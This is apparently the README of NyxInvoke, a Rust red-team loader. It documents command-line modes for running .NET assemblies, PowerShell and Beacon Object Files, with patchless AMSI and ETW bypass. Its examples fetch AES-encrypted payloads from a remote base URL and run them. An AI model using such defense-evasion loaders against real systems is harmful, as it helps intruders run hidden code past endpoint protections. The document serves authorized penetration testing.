# NyxInvoke

NyxInvoke is a rust based command-line tool designed for executing .NET assemblies, PowerShell commands/scripts, and Beacon Object Files (BOFs) with built-in patchless AMSI and ETW bypass capabilities.

## Features

- Execute .NET assemblies
- Run PowerShell commands or scripts
- Load and execute Beacon Object Files (BOFs)
- Built-in patchless AMSI (Anti-Malware Scan Interface) bypass
- Built-in patchless ETW (Event Tracing for Windows) bypass
- Support for encrypted payloads with AES decryption
- Flexible input options: local files, URLs, or compiled-in data

## Usage

NyxInvoke supports three main modes of operation:

1. CLR Mode (.NET assembly execution)
2. PowerShell Mode
3. BOF Mode (Beacon Object File execution)

### General Syntax

```
NyxInvoke.exe <mode> [OPTIONS]
```

Where `<mode>` is one of: `clr`, `ps`, or `bof`.

### Mode-Specific Options

1. CLR Mode:
```text
Execute a .NET assembly

Usage: NyxInvoke.exe clr [OPTIONS]

Options:
      --args <ARGS>                          Arguments for the executable
      --base <BASE_URL_OR_PATH>              Base URL or Base Path
      --key <KEY_FILENAME_OR_URL>            Key filename or URL
      --iv <IV_FILENAME_OR_URL>              IV filename or URL
      --assembly <ASSEMBLY_FILENAME_OR_URL>  Assembly filename or URL
  -h, --help                                 Print help
```
2. PowerShell Mode:
```text
Execute a PowerShell command or script

Usage: NyxInvoke.exe ps [OPTIONS]

Options:
      --command <COMMAND>  PowerShell command to execute
      --script <SCRIPT>    Path to a PowerShell script to execute
  -h, --help               Print help                                Print help
```

3. BOF Mode:
```text
Execute a Beacon Object File (BOF)

Usage: NyxInvoke.exe bof [OPTIONS]

Options:
      --args <ARGS>...             Arguments for the BOF
      --base <BASE_URL_OR_PATH>    Base URL or Base Path
      --key <KEY_FILENAME_OR_URL>  Key filename or URL
      --iv <IV_FILENAME_OR_URL>    IV filename or URL
      --bof <BOF_FILENAME_OR_URL>  BOF filename or URL
  -h, --help                       Print help                                Print help
```

## Examples

### CLR Mode

1. Remote Execution:
   ```
   NyxInvoke.exe clr --base https://example.com/resources --key clr_aes.key --iv clr_aes.iv --assembly clr_data.enc --args arg1 arg2
   ```

2. Local Execution:
   ```
   NyxInvoke.exe clr --key C:\path\to\clr_aes.key --iv C:\path\to\clr_aes.iv --assembly C:\path\to\clr_data.enc --args arg1 arg2
   ```

3. Compiled Execution:
   ```
   NyxInvoke.exe clr --args arg1 arg2
   ```

### PowerShell Mode

1. Script Execution:
   ```
   NyxInvoke.exe ps --script C:\path\to\script.ps1
   ```

2. Direct Command Execution:
   ```
   NyxInvoke.exe ps --command "Get-Process | Select-Object Name, ID"
   ```

### BOF Mode

1. Remote Execution:
   ```
   NyxInvoke.exe bof --base https://example.com/resources --key bof_aes.key --iv bof_aes.iv --bof bof_data.enc --args "str=argument1" "int=42"
   ```

2. Local Execution:
   ```
   NyxInvoke.exe bof --key C:\path\to\bof_aes.key --iv C:\path\to\bof_aes.iv --bof C:\path\to\bof_data.enc --args "str=argument1" "int=42"
   ```

3. Compiled Execution:
   ```
   NyxInvoke.exe bof --args "str=argument1" "int=42"
   ```

## Test Resources

In the `resources` directory, you'll find several files to test NyxInvoke's functionality:

1. Encrypted CLR Assembly (Seatbelt):
   - File: `clr_data.enc`
   - Description: An encrypted version of the Seatbelt tool, a C# project for gathering system information.
   - Usage example:
     ```
     NyxInvoke.exe clr --key resources/clr_aes.key --iv resources/clr_aes.iv --assembly resources/clr_data.enc --args AntiVirus
     ```

2. Encrypted BOF (Directory Listing):
   - File: `bof_data.enc`
   - Description: An encrypted Beacon Object File that executes the 'dir' command.
   - Usage example:
     ```
     NyxInvoke.exe bof --key resources/bof_aes.key --iv resources/bof_aes.iv --bof resources/bof_data.enc --args "wstr=C:\\Windows"
     ```


## Building

To build NyxInvoke

```
cargo +nightly build --release --target=x86_64-pc-windows-msvc
```
or with compiled-in CLR or BOF data
```
cargo +nightly build --release --features=compiled_bof,compiled_clr
```

## Screenshot



## Legal Notice

This tool is for educational and authorized testing purposes only. Ensure you have proper permissions before use in any environment.

